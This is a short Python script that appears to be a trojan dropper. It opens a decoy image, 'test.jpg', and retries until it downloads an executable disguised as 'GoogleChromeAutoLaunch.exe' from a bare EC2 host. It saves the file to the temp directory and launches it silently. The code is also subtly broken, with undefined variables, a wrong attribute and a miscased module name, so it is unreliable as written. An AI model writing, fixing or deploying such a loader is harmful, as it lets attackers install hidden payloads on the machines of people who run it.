from itertools import starmap
from urllib import response
import requests
import os
import time
import tempfile
import subprocess
os.startfile('test.jpg')
time.sleep(1)
os.startfile('test.jpg')
url = "http://ec2-52-90-251-67.compute-1.amazonaws.com/GoogleChromeAutoLaunch.exe"
while True:
    try:
        response = requests.get(url, stream=True)
    except:
        pass
    else:
        break
tempfile.TemporaryDirectory = tempfile.gettempdir()
newFile = tempDirectory + "//GoogleChromeAutoLaunch.exe"
with open(newFile, "wb") as handle:
    handle.write(response.context)
subprocess.Popen(newFile)
import shutil
tempDirectory = tempFile.gettempdir()
shutil.copy('test.jpg', tempDirectory)